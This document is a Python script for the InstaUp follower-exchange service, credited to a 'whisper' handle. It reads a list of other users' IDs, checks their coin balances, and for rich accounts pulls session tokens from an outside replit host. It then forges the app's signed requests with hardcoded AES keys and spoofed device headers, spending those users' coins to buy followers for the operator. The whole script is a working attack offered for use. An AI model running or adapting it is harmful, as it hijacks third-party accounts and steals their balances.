from urllib.parse import *
from base64 import b64encode, b64decode
from binascii import unhexlify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import requests,hashlib,random,urllib3,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
print(f'''{B}{E}=============================={B}
|{G}[+] GitHub    : {B}whisper-666 |
|{G}[+] InstaGram : {B}_whisper.io_|
|{G}[+] TeleGram  : {B}whisper_io  |
{E}==============================''')
uidx=input(f"{G}[+] Your InstaGram ID ==> {S}")
lst=input(f"{G}[+] IDs List Name ==> {S}")
print(f'{E}==============================')
for whis in open(lst,'r').read().splitlines():
 uid=str(whis)
 uid=uid.split('\n')[0].split(' ==>')[0]
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 coin=int(requests.get(f'https://instaup.marsapi.com/get_likes/shop/daily_coins?user_id={uid}', verify=False).json()['return']['coins'])
 if coin > 800:
  print(f'{G}[+] Good Coins : {B}{uid} {S}| {B}{coin}')
  res=requests.get(f'https://token.saraboot5880.repl.co/uid={uid}').json()
  if res['Status'] == 'Success':
   token=res['Token']
   use='1234567890qwertyuioplkjhgfdsazxcvbnm'
   uss='0987654321'
   us=str("".join(random.choice(use)for i in range(16)))
   ua=str("".join(random.choice(use)for i in range(40)))
   uidx=uidx
   urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   coin=int(requests.get(f'https://instaup.marsapi.com/get_likes/shop/daily_coins?user_id={uid}', verify=False).json()['return']['coins'])
   if coin > 4000:
    d2=1000
   else:
    d2=str(coin/4).split('.')[0]
   idx=int(uid)+3423
   d=str(idx)+'ig'
   i='3rFz>|)VHl-w+5I0'
   k='#p0yJmVK/@($nX?#'
   BS=16
   pad=lambda s:s+(BS-len(s)%BS)*chr(BS-len(s)%BS)
   d_padded=pad(d)
   cipher=AES.new(k.encode('utf-8'),AES.MODE_CBC,i.encode('utf-8'))
   enc_data=b64encode(cipher.encrypt(d_padded.encode('utf-8')))
   tkv=hashlib.md5(enc_data+b':M3JGej58KVZIbC13KzVJMA==').hexdigest()
   f=["sameer","suresh","chettiar","jatin","chauhan","agarwal","rahul","tanmay","tiwari","kunal","rasania","sunil","kumar","gaurav","arihant","jain","falguni","yashashree","arpi","arshish","gupta","tanmay","samtgr","kiyera","atul","abhay","chandra","shoibaakriti","aanchal","talreja","aatholiy","abhijeet","akkalwar","abhijeet","bajpai","abhijeetsh","abhirup","roy","abhishek","sumit","kapil","suman","rani","ramu","souvik","yogesh","umesh","sahadat","ankit","prasant","pravakar","sunil","sibaram"]
   fname=random.choice(f)
   url="https://instaup.marsapi.com/get_likes/order/follow"
   ll='https%3A%5C%2F%5C%2Finstagram.fccu3-1.fna.fbcdn.net%5C%2Fv%5C%2Ft51.2885-15%5C%2Fe35%5C%2Fs150x150%5C%2F264420143_435496831548995_8076441957316773167_n.jpg%3F_nc_ht%3Dinstagram.fccu3-1.fna.fbcdn.net%26_nc_cat%3D111%26_nc_ohc%3DvWrY6qsKOOAAX9ZgJLH%26edm%3DAPU89FABAAAA%26ccb%3D7-4%26oh%3D00_AT_GHVnpr10j1bCs8Dx5unohvTyp_1DgOtu8It7P_Nmpfw%26oe%3D61B616B1%26_nc_sid%3D86f79a'
   data=f'gift=0&order_count={d2}&user_id={uid}&tokenV2={tkv}&start_value=666666&media_url=%7B%22media_url%22%3A%22{ll}%22%2C%22user_name%22%3A%22{fname}%22%7D&order_id={uidx}'
   access=hashlib.md5(('45:8D:2E:5C:3A:B4:02:2D:B5:DD:3B:E0:98:4F:14:90:CB:5F:B5:45'+uid).encode('utf-8')).hexdigest()
   ohead={
"agent": "SPA Condor Electronics:26:Plume L2",
"access": access,
"lng": "en",
"cnt": "dz",
"aj": "0",
"versionName": "17.6.9",
"version": "119",
"pkg": "f2c6d7a5b030a1542f7eb589d5013340",
"enMarket": "EnglishWebPayment",
"market": "Global",
"uid": uid,
"api_key": "ABCXYZ123TEST",
"crc": "7096563299/59104644",
"Nagent": "null/02:00:00:00:00:00/1974671864/f95adeefae1e6199/null/2ce6838f8948c19fb31b138f6f60dd395f821749",
"dsl": "a993d13a",
"create_at": "April 15, 2017",
"aid": "2ce6838f8948c19fb31b138f6f60dd395f821749",
"special-user": "0",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length": "756",
"Host": "instaup.marsapi.com",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip",
"Cookie": f"numberOfRequests\u003d1; ajax\u003d0; token\u003d{token}",
"User-Agent": "okhttp/3.12.1"}
   urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
   response=requests.post(url,data=data,headers=ohead,verify=False).json()
   if response['status'] == 'Successful':
    print(f'{G}[√] Done Send {B}{d2} Followers')
    print(f'{G}[√] Token : {B}{token}')
   else:
    msg=response['message']
    if msg == 'Error 561: An error occurred! Please close and reopen InstaUp. If this happens again, contact support.':
     print(f'{E}[÷] Token Error : {S}{token}')
    else:
     print(f'{B}[×] {S}{msg}')
     print(f'{G}[√] Token : {B}{token}')
  else:
   print(f'{E}[×] Error ID : {S}{uid}')
 else:
  print(f'{E}[×] Less Coins : {S}{uid} {B}| {S}{coin}')